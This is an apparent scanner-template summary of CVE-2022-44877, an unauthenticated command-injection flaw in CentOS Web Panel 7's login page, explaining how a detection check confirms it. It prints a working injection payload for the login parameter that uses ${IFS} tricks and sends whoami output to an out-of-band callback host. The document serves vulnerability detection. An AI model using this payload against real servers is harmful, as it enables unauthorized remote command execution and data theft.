---
cve_id: CVE-2022-44877
template_path: nuclei-templates/http/cves/2022/CVE-2022-44877.yaml
affected_product: CentOS Web Panel 7
severity: critical
authentication: none
external_callback: true
affected_versions: <0.9.8.1147
preconditions: []
poc_classification: rce
---

## Vulnerability

CVE-2022-44877 is a critical remote code execution vulnerability in CentOS Web Panel 7 versions prior to 0.9.8.1147. The vulnerability exists in the `/login/index.php` component, which fails to properly sanitize shell metacharacters in user input. This allows unauthenticated attackers to inject and execute arbitrary system commands via crafted HTTP requests. The flaw is classified as CWE-78 (OS Command Injection) and has a CVSS score of 9.8, indicating maximum severity across network attack vector, low complexity, and no privileges or user interaction required.

Successful exploitation enables attackers to execute arbitrary code on the affected system without authentication, potentially leading to complete system compromise. Attackers can execute malware, exfiltrate sensitive information, modify data, and gain full control over the compromised system. The vulnerability has an EPSS score of 0.94457 (99.993rd percentile), indicating extremely high likelihood of active exploitation in the wild. It is also listed in the Known Exploited Vulnerabilities (KEV) catalog.

## PoC / Detection

Classification: rce

The template detects this vulnerability by exploiting the command injection flaw in the login endpoint. It sends a POST request to `/login/index.php` with a malicious `login` parameter containing an injected command: `$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})`. This payload uses command substitution and the `${IFS}` (Internal Field Separator) technique to bypass basic filtering, executing a ping command that includes the output of `whoami` as a subdomain in a DNS query to an attacker-controlled Interactsh server.

The template verifies successful exploitation through three conditions:
1. Detection of DNS protocol interaction with the Interactsh callback server (confirming command execution)
2. Presence of "Login Redirect." text in the response body
3. HTTP 302 redirect status code

The template also extracts the DNS request pattern to capture the command output embedded in the subdomain. This out-of-band detection method confirms that arbitrary commands can be executed on the target system.

## References

- https://twitter.com/_0xf4n9x_/status/1612068225046675457
- https://github.com/numanturle/CVE-2022-44877
- https://gist.github.com/numanturle/c1e82c47f4cba24cff214e904c227386
- https://nvd.nist.gov/vuln/detail/CVE-2022-44877
- http://packetstormsecurity.com/files/171725/Control-Web-Panel-7-CWP7-0.9.8.1147-Remote-Code-Execution.html
